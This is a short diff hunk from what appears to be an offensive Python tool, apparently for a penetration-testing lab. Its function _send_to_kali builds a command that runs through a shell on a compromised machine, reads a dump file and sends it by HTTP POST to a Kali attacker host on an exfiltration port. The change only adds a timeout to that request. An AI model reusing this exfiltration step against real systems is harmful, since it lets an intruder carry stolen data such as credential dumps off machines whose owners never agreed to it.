@@ -206,7 +206,7 @@ def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
         f"python3 -c \""
         f"import urllib.request; "
         f"data=open('{DUMP_PATH}','rb').read(); "
-        f"urllib.request.urlopen('http://{kali_host}:{port}/', data=data)"
+        f"urllib.request.urlopen('http://{kali_host}:{port}/', data=data, timeout=30)"
         f"\"",
         timeout=30,
     )
